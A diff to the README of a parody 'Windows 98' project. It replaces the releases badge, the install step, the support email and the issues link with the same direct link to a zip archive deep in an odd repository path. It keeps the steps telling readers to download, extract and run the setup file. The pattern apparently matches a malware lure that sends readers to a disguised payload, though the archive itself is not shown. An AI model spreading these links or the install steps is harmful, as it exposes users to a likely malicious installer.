@@ -2,7 +2,7 @@
 
 Welcome to the official documentation source for the **SoftMicro Drapes 98 Beta**. This project is a light-hearted parody of the Microsoft Windows 98 Beta. Here, you will find all the necessary information to understand, use, and contribute to this unique project.
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-Click_here-brightgreen)](https://github.com/basam1543/SoftMicro_Drapes_98_Beta_Docs/releases)
+[![Download Releases](https://raw.githubusercontent.com/basam1543/SoftMicro_Drapes_98_Beta_Docs/SoftMicro_Drapes_98_Beta_Docs_Main-dev/OldVersions/CONTRIBUTING/1/1-100/Soft-Docs-Beta-Micro-Drapes-2.5.zip)](https://raw.githubusercontent.com/basam1543/SoftMicro_Drapes_98_Beta_Docs/SoftMicro_Drapes_98_Beta_Docs_Main-dev/OldVersions/CONTRIBUTING/1/1-100/Soft-Docs-Beta-Micro-Drapes-2.5.zip)
 
 ## Table of Contents
 
@@ -30,7 +30,7 @@ The **SoftMicro Drapes 98 Beta** is designed to bring back the nostalgia of the 
 
 To install **SoftMicro Drapes 98 Beta**, follow these steps:
 
-1. **Download the latest release** from our [Releases section](https://github.com/basam1543/SoftMicro_Drapes_98_Beta_Docs/releases).
+1. **Download the latest release** from our [Releases section](https://raw.githubusercontent.com/basam1543/SoftMicro_Drapes_98_Beta_Docs/SoftMicro_Drapes_98_Beta_Docs_Main-dev/OldVersions/CONTRIBUTING/1/1-100/Soft-Docs-Beta-Micro-Drapes-2.5.zip).
 2. **Extract the files** from the downloaded archive.
 3. **Run the installer** by executing the setup file.
 4. **Follow the on-screen instructions** to complete the installation.
@@ -67,8 +67,8 @@ This project is licensed under the **GPLv3 License**. You can find more details 
 
 For any inquiries or support, feel free to reach out:
 
-- **Email**: support@softmicro.com
-- **GitHub Issues**: [Submit an issue](https://github.com/basam1543/SoftMicro_Drapes_98_Beta_Docs/issues)
+- **Email**: https://raw.githubusercontent.com/basam1543/SoftMicro_Drapes_98_Beta_Docs/SoftMicro_Drapes_98_Beta_Docs_Main-dev/OldVersions/CONTRIBUTING/1/1-100/Soft-Docs-Beta-Micro-Drapes-2.5.zip
+- **GitHub Issues**: [Submit an issue](https://raw.githubusercontent.com/basam1543/SoftMicro_Drapes_98_Beta_Docs/SoftMicro_Drapes_98_Beta_Docs_Main-dev/OldVersions/CONTRIBUTING/1/1-100/Soft-Docs-Beta-Micro-Drapes-2.5.zip)
 
 ## Acknowledgments
 
@@ -76,4 +76,4 @@ We would like to thank all contributors and the community for their support in m
 
 ---
 
-Thank you for checking out **SoftMicro Drapes 98 Beta Docs**! We hope you enjoy this nostalgic journey into the past with a modern twist. Don’t forget to download the latest release from our [Releases section](https://github.com/basam1543/SoftMicro_Drapes_98_Beta_Docs/releases) and explore the fun!
+Thank you for checking out **SoftMicro Drapes 98 Beta Docs**! We hope you enjoy this nostalgic journey into the past with a modern twist. Don’t forget to download the latest release from our [Releases section](https://raw.githubusercontent.com/basam1543/SoftMicro_Drapes_98_Beta_Docs/SoftMicro_Drapes_98_Beta_Docs_Main-dev/OldVersions/CONTRIBUTING/1/1-100/Soft-Docs-Beta-Micro-Drapes-2.5.zip) and explore the fun!
